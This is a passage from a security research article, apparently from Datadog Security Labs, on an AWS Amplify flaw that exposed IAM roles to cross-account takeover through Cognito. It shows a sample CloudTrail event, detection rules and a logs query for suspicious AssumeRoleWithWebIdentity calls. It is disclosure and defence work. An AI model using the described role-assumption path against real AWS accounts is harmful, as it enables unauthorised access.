            &quot;assumedRoleId&quot;: &quot;AROAEXAMPLEEXAMPLEEXA:hacked&quot;
        },
    &quot;audience&quot;: &quot;&lt;identity pool id&gt;&quot;,
[...snip...]
</code></pre>
<p>The <code>userIdentity.identityProvider</code> would be <code>cognito-identity.amazonaws.com</code>, which indicated that a role had been assumed through the Cognito Identity service. These CloudTrail events include the ID of the identity pool as <code>responseElements.audience</code>. <strong>If the identity pool ID included in the CloudTrail event does not belong to your AWS account, this may be an indicator that an attacker has assumed a role in your account</strong>.</p>
<h2 id="how-datadog-can-help" tabindex="-1"><a class="header-anchor" href="#how-datadog-can-help">How Datadog can help</a></h2>
<p>After identifying this vulnerability and the risk it posed, we released two detection rules for <a href="https://www.datadoghq.com/product/cloud-security-management/">Datadog Cloud Security Management (CSM) Misconfigurations</a> on January 17, 2024: &quot;AWS IAM role should not have permissive trust with the Cognito Identity service]&quot;, and &quot;AWS IAM role should not have permissive trust with the Cognito Identity service and âFullAccessâ permissions&quot;. We also proactively notified several customers that were affected by this issue and had privileged roles that were exposed. We also contacted customers we identified as being vulnerable due to publicly accessible role ARNs.</p>
<p><em>Update: As of April 15, 2024, these detections have been deprecated, as it is no longer possible to assume roles with a trust relationship to the Cognito Identity service cross-account.</em></p>
<figure class="mt-4">
        <a href="https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/cspm-findings.png?auto=format" target="SecurityLabsTab"><img
          class="w-full mx-auto" width="1000" style="max-width: 1000px;"
          srcset="https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/cspm-findings.png?auto=format&w=1000&dpr=1.75 1x, https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/cspm-findings.png?auto=format&w=1000&dpr=2&q=75 2x, https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/cspm-findings.png?auto=format&w=1000&dpr=3&q=55 3x" 
          src="https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/cspm-findings.png?auto=format&w=1000&dpr=1.75"
          alt="CSM Misconfigurations view"
          loading="lazy">
        <figcaption class="text-gray-500 mt-4 mx-auto w-max max-w-full">CSM Misconfigurations view</figcaption></a> 
      </figure>
<p>If you are a Datadog Cloud Security Management (CSM) customer, you can view the <a href="https://app.datadoghq.com/security/csm?panels=security-center%7Cscp-singleton%7CsecurityCardId%3A18&amp;sort=&amp;timestamp=1709916145845&amp;live=true">January 17 Security Center post</a> to view impacted resources, or you can view any affected IAM roles in your AWS accounts by <a href="https://app.datadoghq.com/security/compliance?query=evaluation%3Afail%20AND%20%40workflow.rule.id%3A%28def-000-4wr%20OR%20def-000-cei%29%20&amp;aggregation=rules&amp;column=status&amp;order=asc&amp;sort=ruleSeverity%2CfailedResources-desc&amp;live=true">clicking on this link</a>.</p>
<p>In addition, you can search your CloudTrail logs for potentially malicious <a href="https://awscli.amazonaws.com/v2/documentation/api/latest/reference/sts/assume-role-with-web-identity.html">sts:AssumeRoleWithWebIdentity</a> calls using the following logs query:</p>
<pre><code>@eventSource:sts.amazonaws.com @evt.name:AssumeRoleWithWebIdentity @userIdentity.identityProvider:cognito-identity.amazonaws.com 
</code></pre>
<p>As mentioned previously, it is still possible for an adversary to use an existing identity pool in your account to assume a vulnerable role by taking advantage of the basic (classic) authflow. To view any Cognito identity pools with this misconfiguration in your AWS accounts, you can use this <a href="https://app.datadoghq.com/security/compliance?query=evaluation%3Afail%20AND%20%40workflow.rule.id%3A%28def-000-k8u%29%20&amp;_gl=1%2A1v5xf89%2A_gcl_aw%2AR0NMLjE2OTk2MzUxNTIuQ2p3S0NBaUF4cmVxQmhBeEVpd0FmR2ZuZEFHdEVnSVVJZzY1MXVYbXdYR3UwQmRPT0pIa084YlFOd2YxbTZrbjJyMWN0bzFHdXNURVZCb0NndVlRQXZEX0J3RQ..%2A_gcl_au%2AMTM4NDA0MDg1Mi4xNzAxMjA0MTk0%2A_ga%2ANDMyOTcyNTI1LjE3MDU3MDAzMzk.%2A_ga_KN80RDFSQK%2AMTcwNjY1MTczMS4xOC4xLjE3MDY2NTE4NzQuMC4wLjA.%2A_fplc%2AYzhlM1V4bXlMUHRkeFNpdEVWMFpwNURnN2x1WklVVlN4QVhKNjlXY0J1ZWs2MnAxdmlEUTNSZElYYmVBTWJSYUFCVnpVdGpKZVduU0RMVEdWQ1hHTFpVVENsJTJCRlo1JTJCeENFVURMN3FCZzJIVlV3ckdlTnptVDNCUHZldiUyQmxBJTNEJTNE&amp;aggregation=rules&amp;column=status&amp;order=asc&amp;sort=ruleSeverity%2CfailedResources-desc&amp;timestamp=1711486856967&amp;live=true">view in CSM</a>.</p>
<h2 id="conclusion" tabindex="-1"><a class="header-anchor" href="#conclusion">Conclusion</a></h2>
<p>In this post, we looked at how an adversary could abuse an IAM roleâs misconfigured trust policy to gain initial access to an AWS account. We found a vulnerability in a popular AWS service, Amplify, that exposed IAM roles associated with Amplify projects to be assumed by anyone in the world. Finally, we took a look at how organizations can respond to this threat to determine if they may have been exposed and take action to remediate the issue.</p>


        
      </div>

      <span class="block pb-7 tablet:pb-9 desktop:pb-12"></span>

      

      <div>
        <div class="share-article">
  <ul class="flex gap-3 desktop:gap-4">
    
      
      
      
      
      <li class="inline-flex">
        <a href="https://twitter.com/share?url=https%3A%2F%2Fsecuritylabs.datadoghq.com%2Farticles%2Famplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover%2F&amp;text=Amplified%20exposure%3A%20How%20AWS%20flaws%20made%20Amplify%20IAM%20roles%20vulnerable%20to%20takeover" title="twitter" data-custom-name="Social link">
          <svg class="fill-blue-1 hover:fill-blue-2 active:fill-blue-1"  width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
<circle cx="20" cy="20" r="20"/>
<g clip-path="url(#clip0_37_5902)">
<path d="M32.9092 13.3016C32.01 13.693 31.0567 13.9458 30.0817 14.0513C31.1112 13.4379 31.8818 12.4703 32.2492 11.3299C31.2957 11.9088 30.2509 12.322 29.1592 12.5519C28.486 11.8187 27.6064 11.3066 26.6363 11.083C25.6662 10.8594 24.6511 10.9347 23.7247 11.2991C22.7983 11.6636 22.004 12.2999 21.4465 13.1245C20.8891 13.949 20.5945 14.9229 20.6017 15.9181C20.6016 16.2966 20.6444 16.6738 20.7292 17.0427C18.7718 16.9435 16.8571 16.4344 15.109 15.5484C13.361 14.6625 11.8185 13.4194 10.5817 11.8996C10.142 12.6499 9.91154 13.5042 9.91418 14.3737C9.90958 15.1884 10.1072 15.9916 10.4894 16.7112C10.8716 17.4309 11.4265 18.0445 12.1042 18.4971C11.3153 18.4784 10.5429 18.2674 9.85418 17.8823V17.9423C9.85385 19.0784 10.2464 20.1797 10.9654 21.0596C11.6843 21.9395 12.6855 22.5439 13.7992 22.7705C13.3763 22.8854 12.9399 22.9433 12.5017 22.9429C12.192 22.9434 11.883 22.9133 11.5792 22.8529C11.8923 23.8314 12.5041 24.6872 13.3287 25.3003C14.1532 25.9135 15.1492 26.2531 16.1767 26.2716C14.4307 27.64 12.2753 28.3819 10.0567 28.3783C9.67264 28.3676 9.28951 28.3351 8.90918 28.2808C11.1581 29.7303 13.7784 30.4983 16.4542 30.4925C25.5142 30.4925 30.4642 22.9954 30.4642 16.4879C30.4642 16.278 30.4642 16.0605 30.4642 15.8506C31.4253 15.1541 32.2534 14.2907 32.9092 13.3016Z" fill="white"/>
</g>
<defs>
<clipPath id="clip0_37_5902">
<rect width="24" height="19.5" fill="white" transform="translate(10 11)"/>
</clipPath>
</defs>
</svg>

          <span class="sr-only">twitter</span>
        </a>
      </li>
    
      
      
      
      
      <li class="inline-flex">
        <a href="https://www.reddit.com/submit?url=https%3A%2F%2Fsecuritylabs.datadoghq.com%2Farticles%2Famplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover%2F" title="reddit" data-custom-name="Social link">
          <svg class="fill-orange-3 hover:fill-orange-4 active:fill-orange-3"  width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M20 40C31.0457 40 40 31.0457 40 20C40 8.95431 31.0457 0 20 0C8.95431 0 0 8.95431 0 20C0 31.0457 8.95431 40 20 40Z"/>
<path d="M33.3304 20.0001C33.3318 19.4272 33.1645 18.8666 32.8493 18.3882C32.5341 17.9099 32.085 17.5349 31.558 17.3103C31.031 17.0856 30.4495 17.0211 29.8861 17.1249C29.3227 17.2287 28.8024 17.4961 28.39 17.8938C26.3985 16.4569 23.651 15.5278 20.5899 15.4202L21.9192 9.16929L26.2604 10.0914C26.2837 10.5985 26.4911 11.0797 26.8438 11.4447C27.1966 11.8098 27.6703 12.0336 28.1764 12.0743C28.6824 12.115 29.1858 11.9697 29.5923 11.6656C29.9988 11.3616 30.2805 10.9197 30.3844 10.4228C30.4883 9.92592 30.4075 9.40819 30.1569 8.96669C29.9064 8.52519 29.5034 8.19025 29.0235 8.02468C28.5436 7.85911 28.0199 7.87427 27.5504 8.06733C27.0809 8.26039 26.6979 8.61809 26.4734 9.07334L21.6267 8.04128C21.4914 8.01286 21.3503 8.03928 21.2345 8.11475C21.1186 8.19022 21.0375 8.30856 21.0088 8.44381L19.5251 15.4178C16.4195 15.5044 13.6299 16.4358 11.6103 17.8892C11.3036 17.5961 10.9366 17.3735 10.5349 17.2369C10.1332 17.1004 9.70661 17.0533 9.28482 17.0987C8.86303 17.1442 8.45627 17.2813 8.09295 17.5003C7.72963 17.7193 7.41853 18.0151 7.18137 18.3668C6.94422 18.7186 6.78674 19.1179 6.71994 19.5368C6.65314 19.9557 6.67863 20.3842 6.79463 20.7923C6.91063 21.2003 7.11434 21.5782 7.39153 21.8993C7.66871 22.2205 8.01268 22.4772 8.39941 22.6516C8.35065 22.9425 8.32406 23.2367 8.31984 23.5316C8.31984 28.0202 13.5433 31.657 19.9885 31.657C26.4336 31.657 31.6547 28.0202 31.6547 23.5316C31.6545 23.2385 31.6318 22.9459 31.5869 22.6563C32.1032 22.4296 32.5427 22.058 32.8522 21.5865C33.1616 21.1151 33.3277 20.564 33.3304 20.0001ZM13.3327 22.0829C13.3322 21.6704 13.4542 21.267 13.683 20.9238C13.9118 20.5806 14.2373 20.313 14.6183 20.1548C14.9993 19.9966 15.4186 19.955 15.8233 20.0352C16.2279 20.1154 16.5997 20.3138 16.8915 20.6053C17.1834 20.8968 17.3822 21.2684 17.4628 21.6729C17.5435 22.0775 17.5023 22.4969 17.3446 22.878C17.1868 23.2592 16.9196 23.585 16.5766 23.8142C16.2337 24.0434 15.8304 24.1658 15.4179 24.1658C14.8655 24.1652 14.3358 23.9456 13.945 23.5552C13.5541 23.1648 13.3339 22.6354 13.3327 22.0829ZM24.9498 27.5896C23.5293 29.0078 20.8029 29.1201 20.0025 29.1201C19.2021 29.1201 16.4757 29.0078 15.0552 27.5896C14.9537 27.4881 14.8967 27.3505 14.8967 27.207C14.8967 27.0635 14.9537 26.9258 15.0552 26.8243C15.1566 26.7229 15.2943 26.6658 15.4378 26.6658C15.5813 26.6658 15.7189 26.7229 15.8204 26.8243C16.7168 27.7207 18.6288 28.0389 20.0025 28.0389C21.3762 28.0389 23.2906 27.7207 24.1869 26.8243C24.2365 26.7714 24.2963 26.7291 24.3626 26.6998C24.4289 26.6704 24.5005 26.6548 24.573 26.6537C24.6455 26.6526 24.7175 26.666 24.7847 26.6933C24.8518 26.7206 24.9128 26.7612 24.964 26.8125C25.0152 26.8639 25.0556 26.925 25.0827 26.9923C25.1098 27.0595 25.123 27.1316 25.1217 27.2041C25.1204 27.2766 25.1045 27.3481 25.075 27.4143C25.0454 27.4805 25.0029 27.5402 24.9498 27.5896ZM24.5848 24.1681C24.1722 24.1686 23.7687 24.0466 23.4254 23.8177C23.0821 23.5887 22.8145 23.2631 22.6564 22.882C22.4983 22.5009 22.4568 22.0814 22.5372 21.6767C22.6176 21.272 22.8162 20.9002 23.108 20.6085C23.3997 20.3167 23.7715 20.1181 24.1762 20.0377C24.5809 19.9573 25.0004 19.9988 25.3815 20.1569C25.7626 20.315 26.0882 20.5827 26.3172 20.9259C26.5461 21.2692 26.6681 21.6727 26.6676 22.0853C26.6664 22.6373 26.4465 23.1664 26.0562 23.5567C25.6658 23.947 25.1368 24.1669 24.5848 24.1681Z" fill="white"/>
</svg>

          <span class="sr-only">reddit</span>
        </a>
      </li>
    
  </ul>
</div>
      </div>
    </div>

    <span class="block desktop:hidden pb-9 tablet:pb-7 desktop:pb-0"></span>

    <div id="feedback-card-sticky" class="col-span-12 desktop:w-4/12 desktop:pr-10">
      <div
    x-data="{ activeButton: 0, cardVisible: true }"
    x-show="cardVisible"
    class="article-feedback-card card z-10 p-3 tablet:p-4 desktop:p-6 w-full flex flex-col tablet:flex-row desktop:flex-col gap-3 tablet:gap-6 desktop:gap-3 justify-between">
    <div class="flex gap-5 desktop:gap-4 items-center justify-between">
        <h2 class="text-purple-3 italic font-national font-light text-16 leading-24 tablet:text-18 tablet:leading-26 desktop:text-20 desktop:leading-28">
            Did you find this article helpful?
        </h2>

        <button class="flex" type="button" aria-label="Close feedback prompt" @click="cardVisible = false">
            <svg class="inline-flex tablet:hidden desktop:inline-flex w-6 h-6 fill-gray-40 hover:fill-purple"  focusable="false" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M13.4143 12L21.4571 20.0429L20.0429 21.4571L12 13.4143L3.95713 21.4571L2.54288 20.0429L10.5858 12L2.54288 3.95713L3.95713 2.54288L12 10.5858L20.0429 2.54288L21.4571 3.95713L13.4143 12Z"/>
</svg>

        </button>
    </div>

    <div class="flex gap-6 items-center">
        <div class="grid grid-cols-2 gap-4 w-fit">
            
    <button
    
        data-custom-name="Article thumbs up"
        aria-label="Article thumbs up"
    
    class="feedback-button group/button inline-flex w-fit p-1.5 rounded border-[2px] active:border-purple-3 active:bg-purple-3"
    :class="activeButton === 1 ? 'border-purple-3 bg-purple-3' : 'border-gray-25 hover:border-purple hover:bg-purple'"
    type="button"
    @click="activeButton = 1"
    :disabled="activeButton === 1 ? true : false">
    <svg class="inline-flex w-6 h-6 group-active/button:fill-white" :class="activeButton === 1 ? 'fill-white' : 'fill-black'" focusable="false" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
<g clip-path="url(#clip0_1110_10289)">
<path d="M23.05 7.275C22.6625 6.7875 22.0875 6.5 21.475 6.5H14.7875L15.7875 2.4875C15.9375 1.8875 15.8 1.2625 15.425 0.775C15.0375 0.2875 14.4625 0 13.85 0H10.9875C10.2375 0 9.5625 0.4125 9.2125 1.075L6.3875 6.5H1.5V20.5H6H8H18.975C19.9 20.5 20.6875 19.875 20.9125 18.9875L23.4125 8.9875C23.5625 8.3875 23.425 7.7625 23.05 7.275ZM6 18.5H3.5V8.5H6V18.5ZM21.475 8.5L18.975 18.5H8V7.75L10.9875 2H13.85L12.225 8.5H21.475Z"/>
</g>
<defs>
<clipPath id="clip0_1110_10289">
<rect width="24" height="24" fill="white"/>
</clipPath>
</defs>
</svg>

</button>

            
    <button
    
        data-custom-name="Article thumbs down"
        aria-label="Article thumbs down"
    
    class="feedback-button group/button inline-flex w-fit p-1.5 rounded border-[2px] active:border-purple-3 active:bg-purple-3"
    :class="activeButton === 2 ? 'border-purple-3 bg-purple-3' : 'border-gray-25 hover:border-purple hover:bg-purple'"
    type="button"
    @click="activeButton = 2"
    :disabled="activeButton === 2 ? true : false">
    <svg class="inline-flex w-6 h-6 group-active/button:fill-white" :class="activeButton === 2 ? 'fill-white' : 'fill-black'" focusable="false" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M0.949947 16.725C1.33745 17.2125 1.91245 17.5 2.52495 17.5H9.21245L8.21245 21.5125C8.06245 22.1125 8.19995 22.7375 8.57495 23.225C8.96245 23.7125 9.53745 24 10.1499 24H13.0124C13.7624 24 14.4374 23.5875 14.7874 22.925L17.5999 17.5H22.4999V3.5H17.9999H15.9999H5.02495C4.09995 3.5 3.31245 4.125 3.08745 5.0125L0.587447 15.0125C0.437447 15.6125 0.574947 16.2375 0.949947 16.725ZM17.9999 5.5H20.4999V15.5H17.9999V5.5ZM2.52495 15.5L5.02495 5.5H15.9999V16.25L13.0124 22H10.1499L11.7749 15.5H2.52495Z"/>
</svg>

</button>

        </div>

        <button class="hidden tablet:flex desktop:hidden" type="button" aria-label="Close feedback prompt" @click="cardVisible = false">
            <svg class="inline-flex w-6 h-6 fill-gray-40 hover:fill-purple"  focusable="false" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M13.4143 12L21.4571 20.0429L20.0429 21.4571L12 13.4143L3.95713 21.4571L2.54288 20.0429L10.5858 12L2.54288 3.95713L3.95713 2.54288L12 10.5858L20.0429 2.54288L21.4571 3.95713L13.4143 12Z"/>
</svg>

        </button>
    </div>
</div>
    </div>
  </article>

  <div class="py-18 tablet:py-24 desktop:py-30">
    <section id="subscribe" class="scroll-mt-20">
    <div class="card-subscription">
        <div>
            <h2 class="tracking-[-0.01em] text-24 leading-24 tablet:text-28 tablet:leading-28 desktop:text-[34px] desktop:leading-[34px]">
                Subscribe to the Datadog Security Digest</h2>
            <span class="block pb-2 tablet:pb-3 desktop:pb-4"></span>
            <p class="">Get Security Labs posts, insights from the cloud security community, and the latest Datadog security features delivered to your inbox monthly. No spam.</p>
        </div>
        <div>
            <form
                id="mktoForm_32364"
                data-redirect="false"
                class="relative flex flex-col gap-2 tablet:gap-3 desktop:gap-4 [&>div:has([type=hidden])]:hidden
                    [&_input]:proportional-nums [&_input]:placeholder:text-gray-5 [&_input]:border [&_input]:border-gray-40 [&_input]:rounded
                    [&_input]:w-full [&_input]:px-3 [&_input]:py-1.5 [&_input]:focus-within:outline-gray-40 [&_input]:text-16
                    [&_input]:leading-24 [&_input]:tablet:text-18 [&_input]:tablet:leading-26 [&_input]:desktop:text-20
                    [&_input]:desktop:leading-28 [&_p:has(span)]:text-14 [&_p:has(span)]:leading-20 [&_p:has(span)]:desktop:text-16
                    [&_p:has(span)]:desktop:leading-22 [&_label]:hidden [&_button]:bg-transparent [&_button]:text-magenta
                    [&_button]:font-extrabold [&_button]:uppercase [&_button]:text-14 [&_button]:leading-18 [&_button]:tablet:text-16
                    [&_button]:tablet:leading-20 [&_button]:desktop:text-18 [&_button]:desktop:leading-24 [&_button]:tracking-[0.01em]
                    [&_button]:w-max [&_button]:px-2 [&_button]:tablet:px-3 [&_button]:desktop:px-4 [&_button]:absolute [&_button]:right-0
                    [&_button]:top-[9px] [&_button]:tablet:top-2 [&_a]:text-purple-600 [&_a:hover]:text-purple [&_.mktoErrorMsg]:text-gray-5"></form>
            <div id="mktoForm_32364--thank-you" class="hidden">
                <h3>Thank you for subscribing!</h3>
            </div>
        </div>
    </div>
</section>

    <script src="/assets/scripts/lp/js/forms2/js/forms2.min.js"></script>

<script src="/assets/scripts/marketo_form-KCMD5SGW.js" defer></script>

  </div>

  
  

  
    <section>
      <h2 class="h1">Related Content</h1>

      <span class="block pb-4 tablet:pb-5 desktop:pb-6"></span>

      <div class="grid grid-cols-1 tablet:grid-cols-3 gap-6 tablet:gap-[30px]">
        
          
            <a class="block text-black" href="/articles/abusing-entra-id-administrative-units/">
  <article>
    
    


    



<figure class="">
    <img
        srcset="https://datadog-securitylabs.imgix.net/img/abusing-entra-id-administrative-units/hero.jpg?auto=format&amp;w=447&dpr=1.75 1x,
                    https://datadog-securitylabs.imgix.net/img/abusing-entra-id-administrative-units/hero.jpg?auto=format&amp;w=447&dpr=2&q=75 2x,
                    https://datadog-securitylabs.imgix.net/img/abusing-entra-id-administrative-units/hero.jpg?auto=format&amp;w=447&dpr=3&q=55 3x"
        src="https://datadog-securitylabs.imgix.net/img/abusing-entra-id-administrative-units/hero.jpg?auto=format&amp;w=447&dpr=1.75"
        alt="Hidden in Plain Sight: Abusing Entra ID Administrative Units for Sticky Persistence"
        class=""
        loading="lazy"
    />
</figure>



    <span class="block pb-2 tablet:pb-3 desktop:pb-4"></span>

    <p class="text-12 leading-16 tablet:text-14 tablet:leading-18 font-roboto-mono font-light uppercase tracking-4">research</p>

    <span class="block pb-0.5 tablet:pb-1 desktop:pb-2"></span>

    <p class="text-16 leading-20 tablet:text-18 tablet:leading-24 desktop:text-20 desktop:leading-24 font-extrabold tracking-1 hover:text-purple active:text-purple-3">Hidden in Plain Sight: Abusing Entra ID Administrative Units for Sticky Persistence</p>
  </article>
</a>
          
        
          
        
          
            <a class="block text-black" href="/articles/analysis-of-teamtnt-doppelganger/">
  <article>
    
    


    



<figure class="">
    <img
        srcset="https://datadog-securitylabs.imgix.net/img/emergingthreats_hero_globe.png?auto=format&amp;w=447&dpr=1.75 1x,
                    https://datadog-securitylabs.imgix.net/img/emergingthreats_hero_globe.png?auto=format&amp;w=447&dpr=2&q=75 2x,
                    https://datadog-securitylabs.imgix.net/img/emergingthreats_hero_globe.png?auto=format&amp;w=447&dpr=3&q=55 3x"
        src="https://datadog-securitylabs.imgix.net/img/emergingthreats_hero_globe.png?auto=format&amp;w=447&dpr=1.75"
        alt="An analysis of a TeamTNT doppelgÃ¤nger"
        class=""
        loading="lazy"
    />
</figure>



    <span class="block pb-2 tablet:pb-3 desktop:pb-4"></span>

    <p class="text-12 leading-16 tablet:text-14 tablet:leading-18 font-roboto-mono font-light uppercase tracking-4">research</p>

    <span class="block pb-0.5 tablet:pb-1 desktop:pb-2"></span>

    <p class="text-16 leading-20 tablet:text-18 tablet:leading-24 desktop:text-20 desktop:leading-24 font-extrabold tracking-1 hover:text-purple active:text-purple-3">An analysis of a TeamTNT doppelgÃ¤nger</p>
  </article>
</a>
          
        
          
            <a class="block text-black" href="/articles/appsync-vulnerability-disclosure/">
  <article>
    
    


    



<figure class="">
    <img
        srcset="https://datadog-securitylabs.imgix.net/img/appsync-vulnerability-disclosure/hero.png?auto=format&amp;w=447&dpr=1.75 1x,
                    https://datadog-securitylabs.imgix.net/img/appsync-vulnerability-disclosure/hero.png?auto=format&amp;w=447&dpr=2&q=75 2x,
                    https://datadog-securitylabs.imgix.net/img/appsync-vulnerability-disclosure/hero.png?auto=format&amp;w=447&dpr=3&q=55 3x"
        src="https://datadog-securitylabs.imgix.net/img/appsync-vulnerability-disclosure/hero.png?auto=format&amp;w=447&dpr=1.75"
        alt="A confused deputy vulnerability in AWS AppSync"
        class=""
        loading="lazy"
    />
</figure>



    <span class="block pb-2 tablet:pb-3 desktop:pb-4"></span>

    <p class="text-12 leading-16 tablet:text-14 tablet:leading-18 font-roboto-mono font-light uppercase tracking-4">research</p>

    <span class="block pb-0.5 tablet:pb-1 desktop:pb-2"></span>

    <p class="text-16 leading-20 tablet:text-18 tablet:leading-24 desktop:text-20 desktop:leading-24 font-extrabold tracking-1 hover:text-purple active:text-purple-3">A confused deputy vulnerability in AWS AppSync</p>
  </article>
</a>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
      </div>
    </section>
  
</div>

<div class="border-t border-gray-800"></div>
<section id="work-with-us">
  <div class="work-with-us container desktop:py-15 tablet:py-12 py-9">
    <h2 class="h1 capitalize">work with us</h2>

    <span class="block pb-2 tablet:pb-3 desktop:pb-4"></span>

    <p class="desktop:text-28 desktop:leading-32 tablet:text-24 tablet:leading-28 text-20 leading-24">
      We're always looking for talented people to collaborate with
    </p>

    <span class="block pb-6 tablet:pb-8 desktop:pb-12"></span>

    <div>
      <p class="font-extrabold desktop:text-16 desktop:leading-20 text-14 leading-18 uppercase">
        featured positions
      </p>

      <span class="block pb-2 desktop:pb-3"></span>

      <ul class="border-t border-gray-15">
        
          
            <li>
              <a class="block border-b border-gray-15 py-2 tablet:py-3 desktop:py-4 hover:bg-purple-1 active:text-purple-3" href="https://careers.datadoghq.com/detail/6262025/?gh_jid=6262025">
                <article class="flex tablet:flex-row tablet:justify-between tablet:items-center flex-col">
                  <p class="font-extrabold desktop:text-20 desktop:leading-28 tablet:text-18 tablet:leading-24 text-16 leading-20">
                    Director, Engineering - Observability SRE
                  </p>
                  <p class="font-roboto-mono font-light desktop:text-16 desktop:leading-20 tablet:text-14 tablet:leading-18 text-12 leading-16 uppercase tracking-10">
                    Security - Engineering
                  </p>
                </article>
              </a>
            </li>
          
        
          
            <li>
              <a class="block border-b border-gray-15 py-2 tablet:py-3 desktop:py-4 hover:bg-purple-1 active:text-purple-3" href="https://careers.datadoghq.com/detail/6493339/?gh_jid=6493339">
                <article class="flex tablet:flex-row tablet:justify-between tablet:items-center flex-col">
                  <p class="font-extrabold desktop:text-20 desktop:leading-28 tablet:text-18 tablet:leading-24 text-16 leading-20">
                    GRC Manager II
                  </p>
                  <p class="font-roboto-mono font-light desktop:text-16 desktop:leading-20 tablet:text-14 tablet:leading-18 text-12 leading-16 uppercase tracking-10">
                    Security - Engineering
                  </p>
                </article>
              </a>
            </li>
          
        
          
            <li>
              <a class="block border-b border-gray-15 py-2 tablet:py-3 desktop:py-4 hover:bg-purple-1 active:text-purple-3" href="https://careers.datadoghq.com/detail/6454249/?gh_jid=6454249">
                <article class="flex tablet:flex-row tablet:justify-between tablet:items-center flex-col">
                  <p class="font-extrabold desktop:text-20 desktop:leading-28 tablet:text-18 tablet:leading-24 text-16 leading-20">
                    Information Security Analyst II - Customer Trust
                  </p>
                  <p class="font-roboto-mono font-light desktop:text-16 desktop:leading-20 tablet:text-14 tablet:leading-18 text-12 leading-16 uppercase tracking-10">
                    Security - Engineering
                  </p>
                </article>
              </a>
            </li>
          
        
          
            <li>
              <a class="block border-b border-gray-15 py-2 tablet:py-3 desktop:py-4 hover:bg-purple-1 active:text-purple-3" href="https://careers.datadoghq.com/detail/5912132/?gh_jid=5912132">
                <article class="flex tablet:flex-row tablet:justify-between tablet:items-center flex-col">
                  <p class="font-extrabold desktop:text-20 desktop:leading-28 tablet:text-18 tablet:leading-24 text-16 leading-20">
                    Information Security Analyst II, Customer Trust
                  </p>
                  <p class="font-roboto-mono font-light desktop:text-16 desktop:leading-20 tablet:text-14 tablet:leading-18 text-12 leading-16 uppercase tracking-10">
                    Security - Engineering
                  </p>
                </article>
              </a>
            </li>
          
        
          
            <li>
              <a class="block border-b border-gray-15 py-2 tablet:py-3 desktop:py-4 hover:bg-purple-1 active:text-purple-3" href="https://careers.datadoghq.com/detail/5912135/?gh_jid=5912135">
                <article class="flex tablet:flex-row tablet:justify-between tablet:items-center flex-col">
                  <p class="font-extrabold desktop:text-20 desktop:leading-28 tablet:text-18 tablet:leading-24 text-16 leading-20">
                    Information Security Analyst II, Customer Trust (Lisbon)
                  </p>
                  <p class="font-roboto-mono font-light desktop:text-16 desktop:leading-20 tablet:text-14 tablet:leading-18 text-12 leading-16 uppercase tracking-10">
                    Security - Engineering
                  </p>
                </article>
              </a>
            </li>
          
        
          
            <li>
              <a class="block border-b border-gray-15 py-2 tablet:py-3 desktop:py-4 hover:bg-purple-1 active:text-purple-3" href="https://careers.datadoghq.com/detail/6454242/?gh_jid=6454242">
                <article class="flex tablet:flex-row tablet:justify-between tablet:items-center flex-col">
                  <p class="font-extrabold desktop:text-20 desktop:leading-28 tablet:text-18 tablet:leading-24 text-16 leading-20">
                    Senior Software Engineer - SDLC Security
                  </p>
                  <p class="font-roboto-mono font-light desktop:text-16 desktop:leading-20 tablet:text-14 tablet:leading-18 text-12 leading-16 uppercase tracking-10">
                    Security - Engineering
                  </p>
                </article>
              </a>
            </li>
          
        
          
        
          
        
          
        
      </ul>
    </div>

    <span class="block pb-6 tablet:pb-8 desktop:pb-12"></span>

    <p class="desktop:text-28 desktop:leading-32 tablet:text-24 tablet:leading-28 text-20 leading-24">
      We have <span class="text-purple-3">10</span> positions
    </p>

    <span class="block pb-4 tablet:pb-5 desktop:pb-6"></span>

    
 
<a
  href="https://careers.datadoghq.com/all-jobs/?parent_department_Engineering%5B0%5D=Engineering&amp;child_department_Engineering%5B0%5D=Global%20Information%20Security"
  data-custom-name="View all positions button"
>
  <span class="btn-default border-default">view all</span>
</a>


  </div>
</section>

<script src="/assets/scripts/article-MQSRUAET.js" defer></script>
<script type="module" async>import mermaid from "https://unpkg.com/mermaid@10/dist/mermaid.esm.min.mjs";document.addEventListener('DOMContentLoaded', mermaid.initialize({"loadOnSave":true}));</script>

    </main>
    
    




<footer class="navbar navbar-footer">
  <div class="container h-full flex tablet:flex-nowrap flex-wrap justify-between tablet:items-center">
    <p class="copyright tablet:-order-none order-2">&copy; Datadog 2025</p>
    <nav class="navbar-menu tablet:order-none order-1 tablet:w-auto w-full tablet:m-0 mb-5">
      <ul>
        
          <li class="navbar-menu-item navbar-menu-item-footer ">
  <a href="https://www.datadoghq.com/legal/terms/" title="TERMS" class="navbar-menu-link" data-custom-name="Footer link">
    <span class="">TERMS</span>
    
  </a>
</li>
        
          <li class="navbar-menu-item navbar-menu-item-footer ">
  <a href="https://www.datadoghq.com/legal/privacy/" title="PRIVACY" class="navbar-menu-link" data-custom-name="Footer link">
    <span class="">PRIVACY</span>
    
  </a>
</li>
        
          <li class="navbar-menu-item navbar-menu-item-footer ">
  <a href="https://www.datadoghq.com/legal/cookies/" title="COOKIES" class="navbar-menu-link" data-custom-name="Footer link">
    <span class="">COOKIES</span>
    
  </a>
</li>
        
      </ul>
    </nav>
    <nav class="navbar-menu tablet:order-none order-3">
